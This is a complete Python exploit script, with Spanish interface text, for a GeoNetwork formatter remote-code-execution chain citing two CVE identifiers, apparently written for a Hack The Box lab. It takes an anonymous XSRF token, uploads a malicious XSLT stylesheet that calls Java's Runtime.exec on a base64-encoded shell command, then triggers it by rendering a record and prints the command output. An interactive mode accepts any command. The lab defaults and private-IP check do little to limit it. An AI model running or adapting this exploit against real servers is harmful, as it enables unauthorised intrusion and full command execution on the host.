#!/usr/bin/env python3
"""
  ██████╗ ██████╗ ███╗   ███╗███████╗███╗   ██╗████████╗██╗  ██╗
 ██╔════╝██╔═══██╗████╗ ████║██╔════╝████╗  ██║╚══██╔══╝╚██╗██╔╝
 ██║     ██║   ██║██╔████╔██║█████╗  ██╔██╗ ██║   ██║    ╚███╔╝
 ██║     ██║   ██║██║╚██╔╝██║██╔══╝  ██║╚██╗██║   ██║    ██╔██╗
 ╚██████╗╚██████╔╝██║ ╚═╝ ██║███████╗██║ ╚████║   ██║   ██╔╝ ██╗
  ╚═════╝ ╚══════╝ ╚═╝     ╚═╝╚══════╝╚═╝  ╚═══╝   ╚═╝   ╚═╝  ╚═╝

        GeoNetwork formatter RCE  •  CVE-2026-63219 + CVE-2026-58400

        Uso autorizado únicamente en laboratorios desechables.
"""
import argparse
import base64
import html
import ipaddress
import re
import subprocess
import sys
import tempfile
import uuid
from pathlib import Path
from urllib.parse import urlsplit

# ---------------------------------------------------------------------------
# Decoración / UI
# ---------------------------------------------------------------------------
C = {
    "r": "\033[91m", "g": "\033[92m", "y": "\033[93m",
    "b": "\033[94m", "m": "\033[95m", "c": "\033[96m",
    "w": "\033[97m", "dim": "\033[2m", "reset": "\033[0m",
    "bold": "\033[1m",
}
_COLOR = True


def col(text: str, *codes: str) -> str:
    if not _COLOR or not sys.stdout.isatty():
        return text
    return "".join(C[c] for c in codes) + text + C["reset"]


def info(msg: str) -> None:
    print(f"{col('[*]', 'b', 'bold')} {msg}")


def ok(msg: str) -> None:
    print(f"{col('[+]', 'g', 'bold')} {msg}")


def warn(msg: str) -> None:
    print(f"{col('[!]', 'y', 'bold')} {msg}")


def err(msg: str) -> None:
    print(f"{col('[-]', 'r', 'bold')} {msg}", file=sys.stderr)


def banner() -> None:
    print()
    print(col(__doc__.strip("\n"), "c"))
    print(col("─" * 74, "dim"))


def box(title: str, body: str) -> None:
    lines = body.rstrip("\n").splitlines() or [""]
    width = max(len(title), *(len(x) for x in lines)) + 2
    print(col("┌─ " + title + " " + "─" * (width - len(title) - 2) + "┐", "m"))
    for line in lines:
        print(col("│ ", "m") + line.ljust(width - 2) + col(" │", "m"))
    print(col("└" + "─" * width + "┘", "m"))


def prompt(label: str, default: str) -> str:
    value = input(f"{col('?', 'y', 'bold')} {label} {col('[' + default + ']', 'dim')}: ").strip()
    return value or default


# ---------------------------------------------------------------------------
# Núcleo
# ---------------------------------------------------------------------------
def validate_base_url(value: str, resolve_ip: str | None) -> tuple[str, list[str]]:
    parsed = urlsplit(value)
    if parsed.scheme not in {"http", "https"} or not parsed.hostname:
        raise ValueError("Usa una URL válida, p. ej. http://geo.airways.htb/geonetwork")
    if parsed.username or parsed.password or parsed.query or parsed.fragment:
        raise ValueError("No se aceptan credenciales, query ni fragmentos en la URL")

    host = parsed.hostname
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    resolve_args: list[str] = []

    try:
        address = ipaddress.ip_address(host)
        if address.version != 4:
            raise ValueError("Solo se soportan IPs literales IPv4")
    except ValueError:
        if not resolve_ip:
            raise ValueError("El hostname requiere --resolve-ip <IPv4 privada>")
        address = ipaddress.ip_address(resolve_ip)
        if address.version != 4 or not address.is_private:
            raise ValueError("--resolve-ip debe ser una IPv4 privada")
        resolve_args = ["--resolve", f"{host}:{port}:{resolve_ip}"]

    return value.rstrip("/"), resolve_args


def build_base_url(args) -> str:
    if args.base_url:
        return args.base_url.rstrip("/")
    default_port = 443 if args.scheme == "https" else 80
    netloc = args.host if args.port == default_port else f"{args.host}:{args.port}"
    return f"{args.scheme}://{netloc}{args.path.rstrip('/')}"


def curl(args, *, timeout=180):
    return subprocess.run(
        ["curl", "-sk", "--silent", "--show-error",
         "--max-time", str(timeout), *args],
        capture_output=True, text=True, check=False, timeout=timeout + 5,
    )


def get_xsrf(base_url: str, cookie_jar: str, resolve_args: list[str]) -> str:
    response = curl([
        *resolve_args, "--cookie-jar", cookie_jar, "--cookie", cookie_jar,
        f"{base_url}/srv/eng/catalog.search",
    ])
    if response.returncode:
        raise RuntimeError(f"No se pudo alcanzar el objetivo: {response.stderr.strip()}")
    token = ""
    for line in Path(cookie_jar).read_text(encoding="utf-8").splitlines():
        if "XSRF-TOKEN" in line and not line.startswith("#"):
            token = line.split("\t")[-1].strip()
    if not token:
        raise RuntimeError("El objetivo no devolvió XSRF-TOKEN")
    return token


def make_formatter(command: str) -> str:
    b64 = base64.b64encode(command.encode()).decode()
    return f'''<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="2.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:output method="html"/>
  <xsl:template match="/">
    <xsl:variable name="p"
        select="Runtime:exec(Runtime:getRuntime(), 'sh -c echo${{IFS}}{b64}|base64${{IFS}}-d|sh')"
        xmlns:Runtime="java:java.lang.Runtime"/>
    <xsl:variable name="rc"
        select="Process:waitFor($p)" xmlns:Process="java:java.lang.Process"/>
    <xsl:variable name="is"
        select="Process:getInputStream($p)" xmlns:Process="java:java.lang.Process"/>
    <xsl:variable name="es"
        select="Process:getErrorStream($p)" xmlns:Process="java:java.lang.Process"/>
    <xsl:variable name="out"
        select="InputStream:readAllBytes($is)" xmlns:InputStream="java:java.io.InputStream"/>
    <xsl:variable name="err"
        select="InputStream:readAllBytes($es)" xmlns:InputStream="java:java.io.InputStream"/>
    <html><body><pre>OUT:
<xsl:value-of select="String:new($out, 'UTF-8')" xmlns:String="java:java.lang.String"/>
ERR:
<xsl:value-of select="String:new($err, 'UTF-8')" xmlns:String="java:java.lang.String"/>
</pre></body></html>
  </xsl:template>
</xsl:stylesheet>
'''


def run_exploit(base_url: str, record_uuid: str, command: str,
                cookie_jar: str, resolve_args: list[str], timeout: int) -> str:
    name = "fmt" + uuid.uuid4().hex[:8]
    formatter_path = Path(cookie_jar).with_name(f"{name}.xsl")
    formatter_path.write_text(make_formatter(command), encoding="utf-8")

    try:
        info("Obteniendo XSRF-TOKEN anónimo ...")
        token = get_xsrf(base_url, cookie_jar, resolve_args)
        ok(f"XSRF: {col(token[:16] + '…', 'dim')}")

        info(f"Subiendo formatter {col(name, 'dim')} ...")
        upload = curl([
            *resolve_args, "--cookie", cookie_jar, "--cookie-jar", cookie_jar,
            "--header", f"X-XSRF-TOKEN: {token}",
            "--header", "Accept: application/json",
            "--form", f"file=@{formatter_path};filename={name}.xsl;type=application/xml",
            "--write-out", "\n%{http_code}", "--output", "-",
            "--request", "POST", f"{base_url}/srv/api/formatters",
        ], timeout=timeout)
        if upload.returncode:
            raise RuntimeError(f"Fallo al subir formatter: {upload.stderr.strip()}")
        body, _, status_text = upload.stdout.rpartition("\n")
        if status_text.strip() not in {"200", "201", "204", "500"}:
            raise RuntimeError(
                f"Upload HTTP {status_text.strip()}: {body[:300]}"
            )
        ok(f"Formatter subido (HTTP {status_text.strip()})")

        info("Renderizando record para disparar Runtime.exec ...")
        render = curl([
            *resolve_args, "--cookie", cookie_jar,
            "--header", "Accept: text/html",
            f"{base_url}/srv/api/records/{record_uuid}/formatters/{name}",
        ], timeout=timeout)
        if render.returncode:
            raise RuntimeError(f"Fallo al renderizar: {render.stderr.strip()}")

        match = re.search(r"<body><pre>(.*?)</pre></body>", render.stdout, re.S)
        if not match:
            raise RuntimeError(
                "Sin salida del comando. Revisa versión, UUID y logs de la app."
            )
        return html.unescape(match.group(1)).strip()
    finally:
        formatter_path.unlink(missing_ok=True)


# ---------------------------------------------------------------------------
# CLI / modo interactivo
# ---------------------------------------------------------------------------
def interactive(args) -> None:
    print(col("\nModo interactivo — elige qué quieres cambiar (Enter = conservar):", "y"))
    args.scheme = prompt("Esquema", args.scheme)
    args.host = prompt("Host o IP", args.host)
    args.port = int(prompt("Puerto", str(args.port)))
    args.path = prompt("Ruta base", args.path)
    args.resolve_ip = prompt("Resolve-IP (vhost, vacío = none)", args.resolve_ip or "")
    args.uuid = prompt("UUID del record", args.uuid)
    args.cmd = prompt("Comando a ejecutar", args.cmd)
    args.timeout = int(prompt("Timeout (s)", str(args.timeout)))
    args.base_url = ""


def main() -> None:
    global _COLOR
    ap = argparse.ArgumentParser(
        description="GeoNetwork formatter RCE interactivo (CVE-2026-63219 + CVE-2026-58400)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=col(
            "Ejemplo:\n"
            "  %(prog)s --host geo.airways.htb --resolve-ip 10.129.245.51 \\\n"
            "    --uuid b8c9d0e1-... --cmd 'id'\n\n"
            "  %(prog)s -i   # modo interactivo\n", "dim"
        ),
    )
    ap.add_argument("--scheme", default="http", help="http o https")
    ap.add_argument("--host", default="geo.airways.htb", help="hostname o IP objetivo")
    ap.add_argument("--port", type=int, default=80, help="puerto HTTP (default: 80)")
    ap.add_argument("--path", default="/geonetwork", help="ruta base de GeoNetwork")
    ap.add_argument("--base-url", default="", help="URL completa (sobrescribe scheme/host/port/path)")
    ap.add_argument("--resolve-ip", default=None, help="IPv4 privada para mapear el hostname")
    ap.add_argument("--uuid", default="", help="UUID de un record existente")
    ap.add_argument("--cmd", default="id; hostname", help="comando a ejecutar en GN01")
    ap.add_argument("--cookies", default=None, help="ruta del cookie jar")
    ap.add_argument("--timeout", type=int, default=180, help="timeout por petición")
    ap.add_argument("-i", "--interactive", action="store_true", help="modo interactivo")
    ap.add_argument("--no-color", action="store_true", help="desactivar colores")
    ap.add_argument("-q", "--quiet", action="store_true", help="no mostrar banner")
    args = ap.parse_args()

    _COLOR = not args.no_color
    if not args.quiet:
        banner()

    if args.interactive or not args.uuid:
        interactive(args)

    try:
        base_url = build_base_url(args)
        base_url, resolve_args = validate_base_url(base_url, args.resolve_ip)
        uuid.UUID(args.uuid)

        if args.cookies:
            cookie_jar = args.cookies
            Path(cookie_jar).parent.mkdir(parents=True, exist_ok=True)
            tmp = None
        else:
            tmp = tempfile.TemporaryDirectory(prefix="geonetwork-rce-")
            cookie_jar = str(Path(tmp.name) / "cookies.txt")

        box("OBJETIVO", (
            f"URL       : {base_url}\n"
            f"Resolve   : {args.resolve_ip or '(IP literal)'}\n"
            f"UUID      : {args.uuid}\n"
            f"Comando   : {args.cmd}\n"
            f"Timeout   : {args.timeout}s"
        ))

        try:
            result = run_exploit(
                base_url, args.uuid, args.cmd, cookie_jar, resolve_args, args.timeout
            )
        finally:
            if tmp:
                tmp.cleanup()

        print(col("\n" + "═" * 74, "g"))
        box("OUTPUT", result)
        print(col("═" * 74, "g"))
        ok("Listo.")
    except (ValueError, RuntimeError, subprocess.TimeoutExpired, FileNotFoundError) as exc:
        err(str(exc))
        sys.exit(1)


if __name__ == "__main__":
    main()
